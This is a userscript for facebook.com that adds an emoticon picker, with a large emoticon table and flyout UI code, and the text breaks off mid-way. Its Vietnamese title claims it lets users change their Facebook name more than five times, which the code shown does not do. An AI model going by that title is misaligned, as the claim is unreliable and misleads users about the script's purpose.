// ==UserScript==
// @name            Đổi Tên FaceBook Quá 5 Lần Cực Hot
// @description     All about facebook By Noname
// @include         https://*.facebook.com/*
// @include         https://*.facebook.com/*/*
// @include         http://*.facebook.com/*
// @include         http://*.facebook.com/*/*
// ==/UserScript==
// ==13470X==
// ==============
// ==Icon==
(function() {
	// Active only in main frame
	if (!document.querySelector("#pageNav")) {
		return;
	}
	//console.info("Extra Facebook Smileys");

	// = Data =======
	var emoticons = [ { // Text to picture emoticons
"chars" : " :) ",
		"class" : "emoticon_smile",
		"name" : "Smiley"
	}, {
		"chars" : " :( ",
		"class" : "emoticon_frown",
		"name" : "Frown"
	}, {
		"chars" : " :P ",
		"class" : "emoticon_tongue",
		"name" : "Tongue"
	}, {
        "chars" : " :D ",
		"class" : "emoticon_grin",
		"name" : "Grin"
	}, {
		"chars" : " :o ",
		"class" : "emoticon_gasp",
		"name" : "Gasp"
	}, {
		"chars" : " ;) ",
		"class" : "emoticon_wink",
		"name" : "Wink"
	}, {
		"chars" : " :v ",
		"class" : "emoticon_pacman",
		"name" : "Pacman"
	}, {
		"chars" : " >:( ",
		"class" : "emoticon_grumpy",
		"name" : "GruÃ±Ã³n"
	}, {
		"chars" : " :/ ",
		"class" : "emoticon_unsure",
		"name" : "Unsure"
	}, {
		"chars" : " :'( ",
		"class" : "emoticon_cry",
		"name" : "Cry"
	}, {
		"chars" : " ^_^ ",
		"class" : "emoticon_kiki",
		"name" : "Kiki"
	}, {
		"chars" : " 8) ",
		"class" : "emoticon_glasses",
		"name" : "Glasses"
	}, {
		"chars" : " B| ",
		"class" : "emoticon_sunglasses",
		"name" : "Sunglasses"
	}, {
		"chars" : " <3 ",
		"class" : "emoticon_heart",
		"name" : "Heart"
	}, {
		"chars" : " 3:) ",
		"class" : "emoticon_devil",
		"name" : "Devil"
	}, {
		"chars" : " O:) ",
		"class" : "emoticon_angel",
		"name" : "Angel"
	}, {
		"chars" : " -_- ",
		"class" : "emoticon_squint",
		"name" : "Squint"
	}, {
		"chars" : " o.O ",
		"class" : "emoticon_confused",
		"name" : "Confused"
	}, {
		"chars" : " >:o ",
		"class" : "emoticon_upset",
		"name" : "Upset"
	}, {
		"chars" : " :3 ",
		"class" : "emoticon_colonthree",
		"name" : "Colonthree"
	}, {
		"chars" : " (y) ",
		"class" : "emoticon_like",
		"name" : "Like"
	}, {
		"chars" : " :* ",
		"class" : "emoticon emoticon_kiss",
		"name" : "Kiss"
	}, {
		"chars" : " (^^^) ",
		"class" : "emoticon_shark",
		"name" : "Shark"
	}, {
		"chars" : " :|] ",
		"class" : "emoticon_robot",
		"name" : "Robot"
	}, {
		"chars" : " <(\") ",
		"class" : "emoticon_penguin",
		"name" : "PingÃ¼ino"
	}, {
		"chars" : " :poop: ",
		"class" : "emoticon_poop",
		"name" : "Poop"
        }, {
		"chars" : " :putnam: ",
		"class" : "emoticon_putnam",
		"name" : "Putman"
	}, {
		"chars" : " \ud83c\udf02 ",
		"class" : "_1az _1a- _2c0",
		"name" : "Pink Umbrella"
	}, {
		"chars" : " \ud83c\udf0a ",
		"class" : "_1az _1a- _2c1",
		"name" : "Sea Wave"
	}, {
		"chars" : " \ud83c\udf19 ",
		"class" : "_1az _1a- _2c2",
		"name" : "Crescent moon"
	}, {
		"chars" : " \ud83c\udf1f ",
		"class" : "_1az _1a- _2c3",
		"name" : "Bright Star"
	}, {
		"chars" : " \ud83c\udf31 ",
		"class" : "_1az _1a- _2c4",
		"name" : "Seedbed"
	}, {
		"chars" : " \ud83c\udf34 ",
		"class" : "_1az _1a- _2c5",
		"name" : "Single Palm Tree"
	}, {
		"chars" : " \ud83c\udf35 ",
		"class" : "_1az _1a- _2c6",
		"name" : "Cactus"
	}, {
		"chars" : " \ud83c\udf37 ",
		"class" : "_1az _1a- _2c7",
		"name" : "Tulip"
	}, {
		"chars" : " \ud83c\udf38 ",
		"class" : "_1az _1a- _2c8",
		"name" : "Cherry Blossom"
	}, {
		"chars" : " \ud83c\udf39 ",
		"class" : "_1az _1a- _2c9",
		"name" : "Rose"
	}, {
		"chars" : " \ud83c\udf3a ",
		"class" : "_1az _1a- _2ca",
		"name" : "Cayenne"
	}, {
		"chars" : " \ud83c\udf3b ",
		"class" : "_1az _1a- _2cb",
		"name" : "Sunflower"
	}, {
		"chars" : " \ud83c\udf3e ",
		"class" : "_1az _1a- _2cc",
		"name" : "Ear Of Rice"
	}, {
		"chars" : " \ud83c\udf40 ",
		"class" : "_1az _1a- _2cd",
		"name" : "Four Leaf Clover"
	}, {
		"chars" : " \ud83c\udf41 ",
		"class" : "_1az _1a- _2ce",
		"name" : "Maple Leaf"
	}, {
		"chars" : " \ud83c\udf42 ",
		"class" : "_1az _1a- _2cf",
		"name" : "Fallen Leaf"
	}, {
		"chars" : " \ud83c\udf43 ",
		"class" : "_1az _1a- _2cg",
		"name" : "Leaf Floating In The Wind"
	}, {
		"chars" : " \ud83c\udf4a ",
		"class" : "_1az _1a- _2ch",
		"name" : "Tangerine"
	}, {
		"chars" : " \ud83c\udf4e ",
		"class" : "_1az _1a- _2ci",
		"name" : "Red Apple"
	}, {
		"chars" : " \ud83c\udf53 ",
		"class" : "_1az _1a- _2cj",
		"name" : "Strawberry"
	}, {
		"chars" : " \ud83c\udf54 ",
		"class" : "_1az _1a- _2ck",
		"name" : "Burger"
	}, {
		"chars" : " \ud83c\udf78 ",
		"class" : "_1az _1a- _2cl",
		"name" : "Cocktail Glass"
	}, {
		"chars" : " \ud83c\udf7a ",
		"class" : "_1az _1a- _2cm",
		"name" : "Tankard"
	}, {
		"chars" : " \ud83c\udf81 ",
		"class" : "_1az _1a- _2cn",
		"name" : "Gift Wrapped"
	}, {
		"chars" : " \ud83c\udf83 ",
		"class" : "_1az _1a- _2co",
		"name" : "Pumpkin With Candle"
	}, {
		"chars" : " \ud83c\udf84 ",
		"class" : "_1az _1a- _2cp",
		"name" : "Christmas Tree"
	}, {
		"chars" : " \ud83c\udf85 ",
		"class" : "_1az _1a- _2cq",
		"name" : "Santa"
	}, {
		"chars" : " \ud83c\udf88 ",
		"class" : "_1az _1a- _2cr",
		"name" : "Balloon"
	}, {
		"chars" : " \ud83c\udf89 ",
		"class" : "_1az _1a- _2cs",
		"name" : "Party Popper"
	}, {
		"chars" : " \ud83c\udf8d ",
		"class" : "_1az _1a- _2ct",
		"name" : "Pine Decor"
	}, {
		"chars" : " \ud83c\udf8e ",
		"class" : "_1az _1a- _2cu",
		"name" : "Japanese Dolls"
	}, {
		"chars" : " \ud83c\udf8f ",
		"class" : "_1az _1a- _2cv",
		"name" : "Carp Streamer"
	}, {
		"chars" : " \ud83c\udf90 ",
		"class" : "_1az _1a- _2cw",
		"name" : "Wind Chime"
	}, {
		"chars" : " \ud83c\udf93 ",
		"class" : "_1az _1a- _2cx",
		"name" : "Graduation Cap"
	}, {
		"chars" : " \ud83c\udfb5 ",
		"class" : "_1az _1a- _2cy",
		"name" : "Musical Note"
	}, {
		"chars" : " \ud83c\udfb6 ",
		"class" : "_1az _1a- _2cz",
		"name" : "Multiple Musical Notes"
	}, {
		"chars" : " \ud83c\udfbc ",
		"class" : "_1az _1a- _2c-",
		"name" : "Musical Score"
	}, {
		"chars" : " \ud83d\udc0d ",
		"class" : "_1az _1a- _2c_",
		"name" : "Snake"
	}, {
		"chars" : " \ud83d\udc0e ",
		"class" : "_1az _1a- _2d0",
		"name" : "Horse"
	}, {
		"chars" : " \ud83d\udc11 ",
		"class" : "_1az _1a- _2d1",
		"name" : "Sheep"
	}, {
		"chars" : " \ud83d\udc12 ",
		"class" : "_1az _1a- _2d2",
		"name" : "Monkey"
	}, {
		"chars" : " \ud83d\udc14 ",
		"class" : "_1az _1a- _2d3",
		"name" : "Hen"
	}, {
		"chars" : " \ud83d\udc17 ",
		"class" : "_1az _1a- _2d4",
		"name" : "Wild Boar"
	}, {
		"chars" : " \ud83d\udc18 ",
		"class" : "_1az _1a- _2d5",
		"name" : "Elephant"
	}, {
		"chars" : " \ud83d\udc19 ",
		"class" : "_1az _1a- _2d6",
		"name" : "Octopus"
	}, {
		"chars" : " \ud83d\udc1a ",
		"class" : "_1az _1a- _2d7",
		"name" : "Snail Shell"
	}, {
		"chars" : " \ud83d\udc1b ",
		"class" : "_1az _1a- _2d8",
		"name" : "Insect"
	}, {
		"chars" : " \ud83d\udc1f ",
		"class" : "_1az _1a- _2d9",
		"name" : "Fish"
	}, {
		"chars" : " \ud83d\udc20 ",
		"class" : "_1az _1a- _2da",
		"name" : "Tropical Fish"
	}, {
		"chars" : " \ud83d\udc21 ",
		"class" : "_1az _1a- _2db",
		"name" : "Pufferfish"
	}, {
		"chars" : " \ud83d\udc25 ",
		"class" : "_1az _1a- _2dc",
		"name" : "Chick In Front"
	}, {
		"chars" : " \ud83d\udc26 ",
		"class" : "_1az _1a- _2dd",
		"name" : "Bird"
	}, {
		"chars" : " \ud83d\udc27 ",
		"class" : "_1az _1a- _2de",
		"name" : "Penguin"
	}, {
		"chars" : " \ud83d\udc28 ",
		"class" : "_1az _1a- _2df",
		"name" : "Koala"
	}, {
		"chars" : " \ud83d\udc29 ",
		"class" : "_1az _1a- _2dg",
		"name" : "Poodle"
	}, {
		"chars" : " \ud83d\udc2b ",
		"class" : "_1az _1a- _2dh",
		"name" : "Bactrian Camel"
	}, {
		"chars" : " \ud83d\udc2c ",
		"class" : "_1az _1a- _2di",
		"name" : "Dolphin"
	}, {
		"chars" : " \ud83d\udc2d ",
		"class" : "_1az _1a- _2dj",
		"name" : "Mouse Face"
	}, {
		"chars" : " \ud83d\udc2e ",
		"class" : "_1az _1a- _2dk",
		"name" : "Cow Face"
	}, {
		"chars" : " \ud83d\udc2f ",
		"class" : "_1az _1a- _2dl",
		"name" : "Cara de tigre"
	}, {
		"chars" : " \ud83d\udc30 ",
		"class" : "_1az _1a- _2dm",
		"name" : "Rabbit Face"
	}, {
		"chars" : " \ud83d\udc31 ",
		"class" : "_1az _1a- _2dn",
		"name" : "Cat Face"
	}, {
		"chars" : " \ud83d\udc33 ",
		"class" : "_1az _1a- _2do",
		"name" : "Whale Sputtering"
	}, {
		"chars" : " \ud83d\udc34 ",
		"class" : "_1az _1a- _2dp",
		"name" : "Horse Face"
	}, {
		"chars" : " \ud83d\udc35 ",
		"class" : "_1az _1a- _2dq",
		"name" : "Monkey Face"
	}, {
		"chars" : " \ud83d\udc37 ",
		"class" : "_1az _1a- _2dr",
		"name" : "Pig face"
	}, {
		"chars" : " \ud83d\udc38 ",
		"class" : "_1az _1a- _2ds",
		"name" : "Frog Face"
	}, {
		"chars" : " \ud83d\udc39 ",
		"class" : "_1az _1a- _2dt",
		"name" : "Hamster Face"
	}, {
		"chars" : " \ud83d\udc3a ",
		"class" : "_1az _1a- _2du",
		"name" : "Wolf Face"
	}, {
		"chars" : " \ud83d\udc3b ",
		"class" : "_1az _1a- _2dv",
		"name" : "Bear Face"
	}, {
		"chars" : " \ud83d\udc3e ",
		"class" : "_1az _1a- _2dw",
		"name" : "Footprints"
	}, {
		"chars" : " \ud83d\udc40 ",
		"class" : "_1az _1a- _2dx",
		"name" : "Eyes"
	}, {
		"chars" : " \ud83d\udc42 ",
		"class" : "_1az _1a- _2dy",
		"name" : "Ear"
	}, {
		"chars" : " \ud83d\udc43 ",
		"class" : "_1az _1a- _2dz",
		"name" : "Nose"
	}, {
		"chars" : " \ud83d\udc44 ",
		"class" : "_1az _1a- _2d-",
		"name" : "Mouth"
	}, {
		"chars" : " \ud83d\udc45 ",
		"class" : "_1az _1a- _2d_",
		"name" : "Sour Face"
	}, {
		"chars" : " \ud83d\udc46 ",
		"class" : "_1az _1a- _2e0",
		"name" : "White hand pointing up"
	}, {
		"chars" : " \ud83d\udc47 ",
		"class" : "_1az _1a- _2e1",
		"name" : "White hand faces downward"
	}, {
		"chars" : " \ud83d\udc48 ",
		"class" : "_1az _1a- _2e2",
		"name" : "White hand indicating left"
	}, {
		"chars" : " \ud83d\udc49 ",
		"class" : "_1az _1a- _2e3",
		"name" : "White hand indicating right"
	}, {
		"chars" : " \ud83d\udc4a ",
		"class" : "_1az _1a- _2e4",
		"name" : "Fist"
	}, {
		"chars" : " \ud83d\udc4b ",
		"class" : "_1az _1a- _2e5",
		"name" : "Hand in motion"
	}, {
		"chars" : " \ud83d\udc4c ",
		"class" : "_1az _1a- _2e6",
		"name" : "Hand showing all good"
	}, {
		"chars" : " \ud83d\udc4d ",
		"class" : "_1az _1a- _2e7",
		"name" : "Hand with thumb up"
	}, {
		"chars" : " \ud83d\udc4e ",
		"class" : "_1az _1a- _2e8",
		"name" : "Hand with thumb down"
	}, {
		"chars" : " \ud83d\udc4f ",
		"class" : "_1az _1a- _2e9",
		"name" : "Hands clapping"
	}, {
		"chars" : " \ud83d\udc50 ",
		"class" : "_1az _1a- _2ea",
		"name" : "Open Hands"
	}, {
		"chars" : " \ud83d\udc66 ",
		"class" : "_1az _1a- _2eb",
		"name" : "Boy"
	}, {
		"chars" : " \ud83d\udc67 ",
		"class" : "_1az _1a- _2ec",
		"name" : "Girl"
	}, {
		"chars" : " \ud83d\udc68 ",
		"class" : "_1az _1a- _2ed",
		"name" : "Man"
	}, {
		"chars" : " \ud83d\udc69 ",
		"class" : "_1az _1a- _2ee",
		"name" : "Woman"
	}, {
		"chars" : " \ud83d\udc6b ",
		"class" : "_1az _1a- _2ef",
		"name" : "Man and woman holding hands"
	}, {
		"chars" : " \ud83d\udc6e ",
		"class" : "_1az _1a- _2eg",
		"name" : "Police Officer"
	}, {
		"chars" : " \ud83d\udc6f ",
		"class" : "_1az _1a- _2eh",
		"name" : "Woman with bunny ears"
	}, {
		"chars" : " \ud83d\udc71 ",
		"class" : "_1az _1a- _2ei",
		"name" : "Person with hair rubio"
	}, {
		"chars" : " \ud83d\udc72 ",
		"class" : "_1az _1a- _2ej",
		"name" : "Man with pi mao gua"
	}, {
		"chars" : " \ud83d\udc73 ",
		"class" : "_1az _1a- _2ek",
		"name" : "Man with turban"
	}, {
		"chars" : " \ud83d\udc74 ",
		"class" : "_1az _1a- _2el",
		"name" : "Old Man"
	}, {
		"chars" : " \ud83d\udc75 ",
		"class" : "_1az _1a- _2em",
		"name" : "Old Woman"
	}, {
		"chars" : " \ud83d\udc76 ",
		"class" : "_1az _1a- _2en",
		"name" : "Baby"
	}, {
		"chars" : " \ud83d\udc77 ",
		"class" : "_1az _1a- _2eo",
		"name" : "Construction Worker"
	}, {
		"chars" : " \ud83d\udc78 ",
		"class" : "_1az _1a- _2ep",
		"name" : "Princess"
	}, {
		"chars" : " \ud83d\udc7b ",
		"class" : "_1az _1a- _2eq",
		"name" : "Ghost"
	}, {
		"chars" : " \ud83d\udc7c ",
		"class" : "_1az _1a- _2er",
		"name" : "Angel baby"
	}, {
		"chars" : " \ud83d\udc7d ",
		"class" : "_1az _1a- _2es",
		"name" : "Alien"
	}, {
		"chars" : " \ud83d\udc7e ",
		"class" : "_1az _1a- _2et",
		"name" : "Alien Monster"
	}, {
		"chars" : " \ud83d\udc7f ",
		"class" : "_1az _1a- _2eu",
		"name" : "Imp"
	}, {
		"chars" : " \ud83d\udc80 ",
		"class" : "_1az _1a- _2ev",
		"name" : "Skull"
	}, {
		"chars" : " \ud83d\udc82 ",
		"class" : "_1az _1a- _2ew",
		"name" : "Guard"
	}, {
		"chars" : " \ud83d\udc83 ",
		"class" : "_1az _1a- _2ex",
		"name" : "Ballerina"
	}, {
		"chars" : " \ud83d\udc85 ",
		"class" : "_1az _1a- _2ey",
		"name" : "Nail Polish"
	}, {
		"chars" : " \ud83d\udc8b ",
		"class" : "_1az _1a- _2ez",
		"name" : "Brand of kiss"
	}, {
		"chars" : " \ud83d\udc8f ",
		"class" : "_1az _1a- _2e-",
		"name" : "Kissing couple"
	}, {
		"chars" : " \ud83d\udc90 ",
		"class" : "_1az _1a- _2e_",
		"name" : "Bunch of flowers"
	}, {
		"chars" : " \ud83d\udc91 ",
		"class" : "_1az _1a- _2f0",
		"name" : "Couple with heart"
	}, {
		"chars" : " \ud83d\udc93 ",
		"class" : "_1az _1a- _2f1",
		"name" : "Heart beating"
	}, {
		"chars" : " \ud83d\udc94 ",
		"class" : "_1az _1a- _2f2",
		"name" : "Broken Heart"
	}, {
		"chars" : " \ud83d\udc96 ",
		"class" : "_1az _1a- _2f3",
		"name" : "Bright Heart"
	}, {
		"chars" : " \ud83d\udc97 ",
		"class" : "_1az _1a- _2f4",
		"name" : "Heart growing"
	}, {
		"chars" : " \ud83d\udc98 ",
		"class" : "_1az _1a- _2f5",
		"name" : "Heart with arrow"
	}, {
		"chars" : " \ud83d\udc99 ",
		"class" : "_1az _1a- _2f6",
		"name" : "Blue Heart"
	}, {
		"chars" : " \ud83d\udc9a ",
		"class" : "_1az _1a- _2f7",
		"name" : "Green Heart"
	}, {
		"chars" : " \ud83d\udc9b ",
		"class" : "_1az _1a- _2f8",
		"name" : "Yellow Heart"
	}, {
		"chars" : " \ud83d\udc9c ",
		"class" : "_1az _1a- _2f9",
		"name" : "Purple Heart"
	}, {
		"chars" : " \ud83d\udc9d ",
		"class" : "_1az _1a- _2fa",
		"name" : "Heart with ribbon"
	}, {
		"chars" : " \ud83d\udca2 ",
		"class" : "_1az _1a- _2fb",
		"name" : "Symbol of anger"
	}, {
		"chars" : " \ud83d\udca4 ",
		"class" : "_1az _1a- _2fc",
		"name" : "Sleeping"
	}, {
		"chars" : " \ud83d\udca6 ",
		"class" : "_1az _1a- _2fd",
		"name" : "Sweat Symbol"
	}, {
		"chars" : " \ud83d\udca8 ",
		"class" : "_1az _1a- _2fe",
		"name" : "Quick Start Symbol"
	}, {
		"chars" : " \ud83d\udca9 ",
		"class" : "_1az _1a- _2ff",
		"name" : "Pile of Caca"
	}, {
		"chars" : " \ud83d\udcaa ",
		"class" : "_1az _1a- _2fg",
		"name" : "Flexed bicep"
	}, {
		"chars" : " \ud83d\udcbb ",
		"class" : "_1az _1a- _2fh",
		"name" : "Personal Computer"
	}, {
		"chars" : " \ud83d\udcbd ",
		"class" : "_1az _1a- _2fi",
		"name" : "Mini Disco"
	}, {
		"chars" : " \ud83d\udcbe ",
		"class" : "_1az _1a- _2fj",
		"name" : "Floppy disk"
	}, {
		"chars" : " \ud83d\udcbf ",
		"class" : "_1az _1a- _2fk",
		"name" : "Optical Disc"
	}, {
		"chars" : " \ud83d\udcc0 ",
		"class" : "_1az _1a- _2fl",
		"name" : "DVD"
	}, {
		"chars" : " \ud83d\udcde ",
		"class" : "_1az _1a- _2fm",
		"name" : "Telephone receiver"
	}, {
		"chars" : " \ud83d\udce0 ",
		"class" : "_1az _1a- _2fn",
		"name" : "Fax"
	}, {
		"chars" : " \ud83d\udcf1 ",
		"class" : "_1az _1a- _2fo",
		"name" : "Mobile Phone"
	}, {
		"chars" : " \ud83d\udcf2 ",
		"class" : "_1az _1a- _2fp",
		"name" : "Mobile phone with arrow from left to right"
	}, {
		"chars" : " \ud83d\udcfa ",
		"class" : "_1az _1a- _2fq",
		"name" : "Television"
	}, {
		"chars" : " \ud83d\udd14 ",
		"class" : "_1az _1a- _2fr",
		"name" : "Bell"
	}, {
		"chars" : " \ud83d\ude01 ",
		"class" : "_1az _1a- _2fs",
		"name" : "Face to face with smiling eyes"
	}, {
		"chars" : " \ud83d\ude02 ",
		"class" : "_1az _1a- _2ft",
		"name" : "Face with tears of joy"
	}, {
		"chars" : " \ud83d\ude03 ",
		"class" : "_1az _1a- _2fu",
		"name" : "Smiley face with open mouth"
	}, {
		"chars" : " \ud83d\ude04 ",
		"class" : "_1az _1a- _2fv",
		"name" : "Face and eyes smiling with mouth open"
	}, {
		"chars" : " \ud83d\ude06 ",
		"class" : "_1az _1a- _2fw",
		"name" : "Smiley face with mouth open and eyes closed"
	}, {
		"chars" : " \ud83d\ude09 ",
		"class" : "_1az _1a- _2fx",
		"name" : "Face winking eye"
	}, {
		"chars" : " \ud83d\ude0b ",
		"class" : "_1az _1a- _2fy",
		"name" : "Guy savoring delicious food"
	}, {
		"chars" : " \ud83d\ude0c ",
		"class" : "_1az _1a- _2fz",
		"name" : "Relief face"
	}, {
		"chars" : " \ud83d\ude0d ",
		"class" : "_1az _1a- _2f-",
		"name" : "Smiley face with heart shaped eyes"
	}, {
		"chars" : " \ud83d\ude0f ",
		"class" : "_1az _1a- _2f_",
		"name" : "Smirk face"
	}, {
		"chars" : " \ud83d\ude12 ",
		"class" : "_1az _1a- _2g0",
		"name" : "Face of boredom"
	}, {
		"chars" : " \ud83d\ude13 ",
		"class" : "_1az _1a- _2g1",
		"name" : "Face with cold sweat"
	}, {
		"chars" : " \ud83d\ude14 ",
		"class" : "_1az _1a- _2g2",
		"name" : "Pensive face"
	}, {
		"chars" : " \ud83d\ude16 ",
		"class" : "_1az _1a- _2g3",
		"name" : "Confused face"
	}, {
		"chars" : " \ud83d\ude18 ",
		"class" : "_1az _1a- _2g4",
		"name" : "Throwing kiss Face"
	}, {
		"chars" : " \ud83d\ude1a ",
		"class" : "_1az _1a- _2g5",
		"name" : "Kissing face with eyes closed"
	}, {
		"chars" : " \ud83d\ude1c ",
		"class" : "_1az _1a- _2g6",
		"name" : "Face with tongue out and winking"
	}, {
		"chars" : " \ud83d\ude1d ",
		"class" : "_1az _1a- _2g7",
		"name" : "Face with tongue hanging out and eyes closed"
	}, {
		"chars" : " \ud83d\ude1e ",
		"class" : "_1az _1a- _2g8",
		"name" : "Face discouraged"
	}, {
		"chars" : " \ud83d\ude20 ",
		"class" : "_1az _1a- _2g9",
		"name" : "Face of anger"
	}, {
		"chars" : " \ud83d\ude21 ",
		"class" : "_1az _1a- _2ga",
		"name" : "Very angry face"
	}, {
		"chars" : " \ud83d\ude22 ",
		"class" : "_1az _1a- _2gb",
		"name" : "Crying Face"
	}, {
		"chars" : " \ud83d\ude23 ",
		"class" : "_1az _1a- _2gc",
		"name" : "Face of perseverance"
	}, {
		"chars" : " \ud83d\ude24 ",
		"class" : "_1az _1a- _2gd",
		"name" : "Face of triumph"
	}, {
		"chars" : " \ud83d\ude25 ",
		"class" : "_1az _1a- _2ge",
		"name" : "Face discouraged but relieved"
	}, {
		"chars" : " \ud83d\ude28 ",
		"class" : "_1az _1a- _2gf",
		"name" : "Scary face"
	}, {
		"chars" : " \ud83d\ude29 ",
		"class" : "_1az _1a- _2gg",
		"name" : "Fatigued face"
	}, {
		"chars" : " \ud83d\ude2a ",
		"class" : "_1az _1a- _2gh",
		"name" : "Sleeping face"
	}, {
		"chars" : " \ud83d\ude2b ",
		"class" : "_1az _1a- _2gi",
		"name" : "Tired face"
	}, {
		"chars" : " \ud83d\ude2d ",
		"class" : "_1az _1a- _2gj",
		"name" : "Face screaming"
	}, {
		"chars" : " \ud83d\ude30 ",
		"class" : "_1az _1a- _2gk",
		"name" : "Face with mouth open and cold sweat"
	}, {
		"chars" : " \ud83d\ude31 ",
		"class" : "_1az _1a- _2gl",
		"name" : "Terrified face of fear"
	}, {
		"chars" : " \ud83d\ude32 ",
		"class" : "_1az _1a- _2gm",
		"name" : "Very surprised face"
	}, {
		"chars" : " \ud83d\ude33 ",
		"class" : "_1az _1a- _2gn",
		"name" : "Face flushed"
	}, {
		"chars" : " \ud83d\ude35 ",
		"class" : "_1az _1a- _2go",
		"name" : "Face dizzy"
	}, {
		"chars" : " \ud83d\ude37 ",
		"class" : "_1az _1a- _2gp",
		"name" : "Face with medical mask"
	}, {
		"chars" : " \ud83d\ude38 ",
		"class" : "_1az _1a- _2gq",
		"name" : "Grinning Cat face and eyes closed"
	}, {
		"chars" : " \ud83d\ude39 ",
		"class" : "_1az _1a- _2gr",
		"name" : "Cat face with tears of laughter"
	}, {
		"chars" : " \ud83d\ude3a ",
		"class" : "_1az _1a- _2gs",
		"name" : "Smiling cat face with open mouth"
	}, {
		"chars" : " \ud83d\ude3b ",
		"class" : "_1az _1a- _2gt",
		"name" : "Smiling cat face with hearts in her eyes"
	}, {
		"chars" : " \ud83d\ude3c ",
		"class" : "_1az _1a- _2gu",
		"name" : "Face of cat smile twisted"
	}, {
		"chars" : " \ud83d\ude3d ",
		"class" : "_1az _1a- _2gv",
		"name" : "Cat face kissing with eyes closed"
	}, {
		"chars" : " \ud83d\ude3f ",
		"class" : "_1az _1a- _2gw",
		"name" : "Cat face crying"
	}, {
		"chars" : " \ud83d\ude40 ",
		"class" : "_1az _1a- _2gx",
		"name" : "Cat face scared terrified"
	}, {
		"chars" : " \ud83d\ude4b ",
		"class" : "_1az _1a- _2gy",
		"name" : "Happy person raising a hand"
	}, {
		"chars" : " \ud83d\ude4c ",
		"class" : "_1az _1a- _2gz",
		"name" : "Person holding up both hands in celebration"
	}, {
		"chars" : " \ud83d\ude4d ",
		"class" : "_1az _1a- _2g-",
		"name" : "Person frowning"
	}, {
		"chars" : " \ud83d\ude4f ",
		"class" : "_1az _1a- _2g_",
		"name" : "Person in prayer"
	}, {
		"chars" : " \u261d ",
		"class" : "_1az _1a- _2h0",
		"name" : "Index finger pointing up"
	}, {
		"chars" : " \u263a ",
		"class" : "_1az _1a- _2h1",
		"name" : "White face smiling"
	}, {
		"chars" : " \u26a1 ",
		"class" : "_1az _1a- _2h2",
		"name" : "High voltage symbol"
	}, {
		"chars" : " \u26c4 ",
		"class" : "_1az _1a- _2h3",
		"name" : "Snowless snowman"
	}, {
		"chars" : " \u270a ",
		"class" : "_1az _1a- _2h4",
		"name" : "Fist up"
	}, {
		"chars" : " \u270b ",
		"class" : "_1az _1a- _2h5",
		"name" : "Hand pointing up"
	}, {
		"chars" : " \u270c ",
		"class" : "_1az _1a- _2h6",
		"name" : "Winning Hand"
	}, {
		"chars" : " \u2600 ",
		"class" : "_1az _1a- _2h7",
		"name" : "Sun With Rays"
	}, {
		"chars" : " \u2601 ",
		"class" : "_1az _1a- _2h8",
		"name" : "Cloud"
	}, {
		"chars" : " \u2614 ",
		"class" : "_1az _1a- _2h9",
		"name" : "Umbrella With Rain Drops"
	}, {
		"chars" : " \u2615 ",
		"class" : "_1az _1a- _2ha",
		"name" : "Hot Drink"
	}, {
		"chars" : " \u2728 ",
		"class" : "_1az _1a- _2hb",
		"name" : "Brightness"
	}, {
		"chars" : " \u2764 ",
		"class" : "_1az _1a- _2hc",
		"name" : "Heavy Black Heart"
	} ];

	// = Variables =======
	var lastActiveElement = document.activeElement;

	// = Functions =======
	function createElement(html) {
		var outerHTML = document.createElement("div");
		outerHTML.innerHTML = html;
		return outerHTML.firstChild;
	}

	function htmlSpecialChars(string) {
		var div = document.createElement("div");
		var text = document.createTextNode(string);
		div.appendChild(text);
		return div.innerHTML;
	}

	function isInstanceOfTextInput(element) {
		return (element instanceof HTMLInputElement && element.type == "text")
				|| element instanceof HTMLTextAreaElement;
	}

	function isFlyoutOpen(flyout) {
		return flyout.className == "openToggler";
	}

	function openFlyout(flyout, open) {
		if (open === undefined) {
			open = !isFlyoutOpen(flyout); // Toggle
		}

		if (open) {
			flyout.className = "openToggler";
		} else {
			flyout.removeAttribute("class");
		}
	}

	function createTab(titleContainer, bodyContainer) {
		var html;
		// Tab; default = inactive
	    html = '<li class="jewelFlyout fbJewelFlyout uiToggleFlyout">';
		html += '<div class="jewelFlyout">';
		html += '</div>';
		html += '</li>';
		var title = createElement(html);
		titleContainer.appendChild(title);

		// Manual input
		html = '<div style="display: none;">';
		html += '</div>';
		var body = createElement(html);
		bodyContainer.appendChild(body);

		// Change tab listener
		(function(body) {
			title.addEventListener("click", function() {
				// Change tab
				var titles = this.parentNode.childNodes; // tab.tabContainer.childNodes
				for ( var t = 0; t < titles.length; t++) {
					if (titles[t] === this) { // Active
						
					} else { // Inactive
						titles[t].style.background = "";
						titles[t].firstChild.style.color = "";
					}
				}

				// Change body
				var bodies = body.parentNode.childNodes; // body.bodyContainer.childNodes
				for ( var b = 0; b < bodies.length; b++) {
					if (bodies[b] === body) { // Show
						body.style.display = "";
					} else { // Hide
						bodies[b].style.display = "none";
					}
				}
			});
		})(body);

		return {
			"title" : title.firstChild,
			"body" : body
		};
	}

	function createTabListBody(emoticons, filter) {
		var html;

		html = '<div style="max-height: 200px; padding-right: 15px; overflow-x: hidden; line-height: 1em;">';
		html += '<div style="padding: 10px; width: 200px; font-size: 15px;">';
		html += '</div>';
		html += '</div>';
		var body = createElement(html).firstChild;
		for ( var e = 0; e < emoticons.length; e++) {
			var emoticon = emoticons[e];
			if (!filter(emoticon)) {
				continue;
			}

			// Icons
			html = '<span class="panelCell" style="display: inline-block; vertical-align: middle; padding: 2px;">';
			html += '<a';
			html += ' class="emoticon'
					+ (emoticon.class !== undefined ? ' ' + emoticon.class : '')
					+ '"';
			html += ' style="text-decoration: inherit; color: inherit;'
					+ (emoticon.class !== undefined ? ' color: transparent;'
							: ' width: auto;') + '"';
			html += (emoticon.name !== undefined ? ' title="' + emoticon.name
					+ '"' : '');
			html += '>';
			html += htmlSpecialChars(emoticon.chars);
			html += '</a>';
			html += '</span>';
			var cell = createElement(html);
			body.appendChild(cell);

			// Select emoticon listener
			var emoticonA = cell.firstChild;
			(function(emoticon) {
				emoticonA.addEventListener("click", function() {
					if (isInstanceOfTextInput(lastActiveElement)) {
						lastActiveElement.focus();

						var chars = emoticon.chars;
						var value = lastActiveElement.value;
						var start = lastActiveElement.selectionStart;
						var end = lastActiveElement.selectionEnd;
						lastActiveElement.value = value.substring(0, start)
								+ chars + value.substring(end);
						lastActiveElement.setSelectionRange(start + chars.length, start + chars.length);
					}

					openFlyoutCommand = false; // Close flyout
				});
			})(emoticon);
		}

		return body.parentNode;
	}

	// = Construct UI =======
	var html;

	// Menu item
	// var navItem
	html = '<li class="navItem middleItem notifNegativeBase">';
	html += '<div class="fbJewel">';
	// {

	// Toggler
